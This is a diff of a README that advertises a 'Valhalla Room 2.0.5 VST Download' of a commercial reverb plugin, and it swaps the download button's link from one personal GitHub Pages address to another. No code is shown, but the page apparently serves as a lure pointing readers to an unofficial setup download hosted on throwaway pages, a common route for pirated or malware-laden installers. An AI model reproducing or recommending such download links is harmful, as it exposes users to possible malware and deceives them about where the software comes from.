@@ -21,7 +21,7 @@ To begin using this **Valhalla Room 2.0.5 Reverb Plugin** and **Valhalla Room 2.
 | :--- | :--- |
 | **Get Valhalla Room 2.0.5 Reverb Plugin** | Click the button below to initiate the setup for this **Valhalla Room 2.0.5 VST Download**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Valhalla_Room_2.0.5_Reverb_Plugin-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/valhalla-room-2-0-5)
+[![Valhalla Room](https://img.shields.io/badge/Explore-Valhalla%20Room-B45309?style=for-the-badge)](https://valhalla-room-reverb.github.io/.github/valhalla-room)
 
 ## System Requirements
 
